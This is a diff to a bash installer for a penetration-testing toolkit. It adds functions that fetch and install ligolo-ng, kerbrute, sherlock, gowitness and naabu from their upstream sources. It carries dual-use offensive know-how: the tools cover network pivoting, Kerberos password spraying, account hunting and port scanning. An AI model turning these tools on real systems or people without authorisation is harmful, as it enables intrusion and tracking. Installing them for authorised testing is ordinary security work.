+		# Modern tunneling / pivoting tool (replaces chisel for many uses).
+		# Distributed as static binaries (no git clone needed).
+		# gitlink is set so install_default's selector still works when called via reinstall_tools.
+		gitlink="https://github.com/nicocha30/ligolo-ng.git"
+		mkdir -p /root/lscript/tools/ligolo-ng
+		ARCH=$(uname -m)
+		case "$ARCH" in
+			x86_64) LIGOLO_ARCH="linux_amd64" ;;
+			aarch64) LIGOLO_ARCH="linux_arm64" ;;
+			*) LIGOLO_ARCH="linux_amd64" ;;
+		esac
+		curl -sSL -o /tmp/ligolo-proxy.tgz "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_${LIGOLO_ARCH}.tar.gz" \
+			&& tar -xzf /tmp/ligolo-proxy.tgz -C /root/lscript/tools/ligolo-ng proxy 2>/dev/null \
+			&& chmod +x /root/lscript/tools/ligolo-ng/proxy \
+			&& ln -sf /root/lscript/tools/ligolo-ng/proxy /usr/local/bin/ligolo-proxy 2>/dev/null \
+			|| echo -e ""$RS"Could not download ligolo-ng proxy (offline?)"$CE""
+		curl -sSL -o /tmp/ligolo-agent.tgz "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_${LIGOLO_ARCH}.tar.gz" \
+			&& tar -xzf /tmp/ligolo-agent.tgz -C /root/lscript/tools/ligolo-ng agent 2>/dev/null \
+			&& chmod +x /root/lscript/tools/ligolo-ng/agent \
+			&& ln -sf /root/lscript/tools/ligolo-ng/agent /usr/local/bin/ligolo-agent 2>/dev/null \
+			|| echo -e ""$RS"Could not download ligolo-ng agent (offline?)"$CE""
+		rm -f /tmp/ligolo-proxy.tgz /tmp/ligolo-agent.tgz
+		echo -e ""$YS"ligolo-ng installed. Proxy/agent in /root/lscript/tools/ligolo-ng/"$CE""
+	}
+
+	function install_kerbrute
+	{
+		# Kerberos username enumeration / password spray
+		if command -v kerbrute >/dev/null 2>&1
+		then
+			echo -e ""$YS"kerbrute already installed."$CE""
+			return 0
+		fi
+		mkdir -p /opt/kerbrute
+		ARCH=$(uname -m)
+		case "$ARCH" in
+			x86_64) KB_ARCH="linux_amd64" ;;
+			aarch64) KB_ARCH="linux_arm64" ;;
+			*) KB_ARCH="linux_amd64" ;;
+		esac
+		curl -sL "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_${KB_ARCH}" \
+			-o /opt/kerbrute/kerbrute 2>/dev/null
+		chmod +x /opt/kerbrute/kerbrute 2>/dev/null || true
+		ln -sf /opt/kerbrute/kerbrute /usr/local/bin/kerbrute 2>/dev/null || true
+	}
+
+	function install_sherlock
+	{
+		# Hunt down social media accounts by username
+		if command -v sherlock >/dev/null 2>&1
+		then
+			echo -e ""$YS"Upgrading sherlock..."$CE""
+			pip3 install --upgrade sherlock-project 2>/dev/null \
+				|| python3 -m pip install --break-system-packages --upgrade sherlock-project
+			return 0
+		fi
+		pip3 install sherlock-project 2>/dev/null \
+			|| python3 -m pip install --break-system-packages sherlock-project
+	}
+
+	function install_gowitness
+	{
+		# Web screenshotter for recon
+		if command -v gowitness >/dev/null 2>&1
+		then
+			echo -e ""$YS"gowitness already installed."$CE""
+			return 0
+		fi
+		apt-get install -y golang-go chromium 2>/dev/null || true
+		export GOPATH="$HOME/go"
+		export PATH="$GOPATH/bin:$PATH"
+		mkdir -p "$GOPATH/bin"
+		GO111MODULE=on go install -v github.com/sensepost/gowitness@latest
+		ln -sf "$GOPATH/bin/gowitness" /usr/local/bin/gowitness 2>/dev/null || true
+	}
+
+	function install_naabu
+	{
+		# Fast port scanner from ProjectDiscovery
+		if command -v naabu >/dev/null 2>&1
+		then
+			echo -e ""$YS"naabu already installed."$CE""
+			return 0
+		fi
+		apt-get install -y golang-go 2>/dev/null || true
+		export GOPATH="$HOME/go"
+		export PATH="$GOPATH/bin:$PATH"
+		mkdir -p "$GOPATH/bin"
+		GO111MODULE=on go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+		ln -sf "$GOPATH/bin/naabu" /usr/local/bin/naabu 2>/dev/null || true
+	}
+
 		
 #------------------------------------
 ####################################
@@ -11645,15 +12074,7 @@ fi
 if [[ -f ""$LPATH"/IAGREE.txt" ]]
 then
 
-	if [[ ! -f ""$LPATH"/wlan.txt" ]]
-	then
-		set_interface_number
-	fi
-	if [[ ! -f ""$LPATH"/wlanmon.txt" ]]
-	then
-		set_interface_number
-	fi
-	if [[ ! -f ""$LPATH"/eth.txt" ]]
+	if [[ ! -f ""$LPATH"/wlan.txt" || ! -f ""$LPATH"/wlanmon.txt" || ! -f ""$LPATH"/eth.txt" ]]
 	then
 		set_interface_number
 	fi
